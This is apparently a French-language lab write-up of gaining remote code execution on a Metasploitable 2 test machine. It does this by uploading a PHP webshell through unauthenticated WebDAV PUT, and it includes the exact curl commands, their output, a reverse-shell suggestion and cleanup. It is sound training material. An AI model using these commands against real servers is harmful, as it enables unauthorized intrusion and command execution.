# Write-up — Web Apache : WebDAV → RCE (Metasploitable 2, port 80)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali : `192.168.56.1`.
Résultat : **exécution de code à distance (RCE)** en tant que **`www-data`** via WebDAV.

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.

**C'est quoi ?** Le serveur Apache héberge plusieurs applis (DVWA, Mutillidae, phpMyAdmin,
TWiki…) et un répertoire **WebDAV** (`/dav/`). WebDAV étend HTTP avec des méthodes d'écriture
(`PUT`, `DELETE`). Ici `PUT` est **autorisé sans authentification** et les fichiers déposés
dans `/dav/` sont **exécutés par PHP** : on peut donc y téléverser un webshell et exécuter des
commandes.

---

## 1. Recon

```bash
nmap -sV -p 80 192.168.56.101
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

`DAV/2` dans la bannière = module WebDAV actif. La page d'accueil liste les applis :

```bash
curl -s http://192.168.56.101/ | grep -iE "href="
```
```
<li><a href="/twiki/">TWiki</a></li>
<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
<li><a href="/mutillidae/">Mutillidae</a></li>
<li><a href="/dvwa/">DVWA</a></li>
<li><a href="/dav/">WebDAV</a></li>
```

## 2. Test d'écriture WebDAV (méthode PUT)

```bash
curl -X PUT http://192.168.56.101/dav/josatest.txt --data "hello-josa"   # -> 201 Created
curl http://192.168.56.101/dav/josatest.txt                              # -> hello-josa
```

**`201 Created`** : le serveur accepte l'écriture de fichiers dans `/dav/` **sans
authentification**. Si PHP s'exécute dans ce répertoire, c'est une RCE directe.

## 3. Exploitation — webshell PHP

On dépose un webshell minimal qui exécute le paramètre `c` :

```bash
printf '<?php system($_GET["c"]); ?>' | \
  curl -X PUT http://192.168.56.101/dav/j.php --data-binary @-     # -> 201 Created

curl "http://192.168.56.101/dav/j.php?c=id;uname%20-a;hostname"
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
```

Le fichier `.php` déposé est **interprété par PHP** → exécution de commande arbitraire côté
serveur, en tant que **`www-data`**.

## 4. Preuve d'accès

`id` renvoyé par le webshell : `uid=33(www-data)`. On peut dès lors lire/écrire ce qui est
accessible à `www-data`, et chercher une élévation de privilèges, ou passer à un reverse shell
interactif (ex. payload `msfvenom -p php/reverse_php` déposé de la même façon).

## 5. Nettoyage

Bonne hygiène : retirer les fichiers déposés pour ne pas laisser de webshell sur la cible.
```bash
curl -X DELETE http://192.168.56.101/dav/j.php          # -> 204
curl -X DELETE http://192.168.56.101/dav/josatest.txt   # -> 204
```

## 6. Surface restante (non traitée ici)

Le port 80 héberge d'autres cibles exploitables, chacune méritant sa propre session : **DVWA**
(login `admin:password`, SQLi/command injection/upload), **Mutillidae** (OWASP Top 10),
**phpMyAdmin** (à recouper avec MySQL root sans mot de passe — voir `mysql.md`), **TWiki**
(RCE `search.cgi`, déjà vue sur MS1). WebDAV a été retenu ici car c'est la RCE la plus directe
et sans authentification.

---

**Pour rejouer :** étapes 2→3, puis nettoyage (étape 5). Encoder les `;` et espaces dans l'URL
(`%20`).
